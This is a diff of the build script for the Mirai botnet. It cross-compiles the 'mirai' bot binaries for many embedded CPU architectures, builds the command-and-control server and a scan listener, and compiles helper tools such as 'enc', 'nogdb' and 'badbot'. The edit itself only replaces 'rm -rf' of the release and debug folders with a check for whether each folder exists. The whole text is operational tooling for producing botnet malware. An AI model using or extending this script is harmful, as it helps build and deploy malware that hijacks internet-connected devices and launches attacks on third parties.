@@ -22,55 +22,59 @@ fi
 
 if [ "$1" == "release" ]; then
 
-    rm -rf release
-    mkdir -p release
+    # rm -rf release
+    if ! [ -d release ]; then
+        mkdir -p release
 
-    compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
-    compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
-    compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
-    compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
-#    compile_bot armv5l mirai.arm5n "$FLAGS -DKILLER_REBIND_SSH"
-#    compile_bot armv6l mirai.arm7 "$FLAGS -DKILLER_REBIND_SSH -static"
-    compile_bot powerpc mirai.ppc "$FLAGS -DKILLER_REBIND_SSH -static"
-    compile_bot sparc mirai.spc "$FLAGS -DKILLER_REBIND_SSH -static"
-    compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
-    compile_bot sh4 mirai.sh4 "$FLAGS -DKILLER_REBIND_SSH -static"
+        compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
+        compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
+        compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
+        compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
+    #    compile_bot armv5l mirai.arm5n "$FLAGS -DKILLER_REBIND_SSH"
+    #    compile_bot armv6l mirai.arm7 "$FLAGS -DKILLER_REBIND_SSH -static"
+        compile_bot powerpc mirai.ppc "$FLAGS -DKILLER_REBIND_SSH -static"
+        compile_bot sparc mirai.spc "$FLAGS -DKILLER_REBIND_SSH -static"
+        compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
+        compile_bot sh4 mirai.sh4 "$FLAGS -DKILLER_REBIND_SSH -static"
 
-    compile_bot i586 miraint.x86 "-static"
-    compile_bot mips miraint.mips "-static"
-    compile_bot mipsel miraint.mpsl "-static"
-    compile_bot armv4l miraint.arm "-static"
-#    compile_bot armv5l miraint.arm5n " "
-#    compile_bot armv6l miraint.arm7 "-static"
-    compile_bot powerpc miraint.ppc "-static"
-    compile_bot sparc miraint.spc "-static"
-    compile_bot m68k miraint.m68k "-static"
-    compile_bot sh4 miraint.sh4 "-static"
+        compile_bot i586 miraint.x86 "-static"
+        compile_bot mips miraint.mips "-static"
+        compile_bot mipsel miraint.mpsl "-static"
+        compile_bot armv4l miraint.arm "-static"
+    #    compile_bot armv5l miraint.arm5n " "
+    #    compile_bot armv6l miraint.arm7 "-static"
+        compile_bot powerpc miraint.ppc "-static"
+        compile_bot sparc miraint.spc "-static"
+        compile_bot m68k miraint.m68k "-static"
+        compile_bot sh4 miraint.sh4 "-static"
 
-    echo ">> Building cnc..."
-    go build -o release/cnc cnc/*.go
-    go build -o release/scanListen tools/scanListen.go
-    echo ">> Build release done."
+        echo ">> Building cnc..."
+        go build -o release/cnc cnc/*.go
+        go build -o release/scanListen tools/scanListen.go
+        echo ">> Build release done."
+    fi
 
 elif [ "$1" == "debug" ]; then
 
-    rm -rf debug
-    mkdir -p debug
+    # rm -rf debug
+    if ! [ -d debug ]; then
+        mkdir -p debug
 
-    i586-gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.x86.dbg
-    mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips.dbg
-    armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm.dbg
-#   armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7.dbg
-    sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4.dbg
+        i586-gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.x86.dbg
+        mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips.dbg
+        armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm.dbg
+        # armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7.dbg
+        sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4.dbg
 
-    gcc -std=c99 tools/enc.c -g -o debug/enc.dbg
-    gcc -std=c99 tools/nogdb.c -g -o debug/nogdb.dbg
-    gcc -std=c99 tools/badbot.c -g -o debug/badbot.dbg
+        gcc -std=c99 tools/enc.c -g -o debug/enc.dbg
+        gcc -std=c99 tools/nogdb.c -g -o debug/nogdb.dbg
+        gcc -std=c99 tools/badbot.c -g -o debug/badbot.dbg
 
-    echo ">> Building cnc..."
-    go build -o debug/cnc cnc/*.go
-    go build -o debug/scanListen tools/scanListen.go
-    echo ">> Build debug done."
+        echo ">> Building cnc..."
+        go build -o debug/cnc cnc/*.go
+        go build -o debug/scanListen tools/scanListen.go
+        echo ">> Build debug done."
+    fi
 
 elif [ "$1" == "cnc" ]; then
 
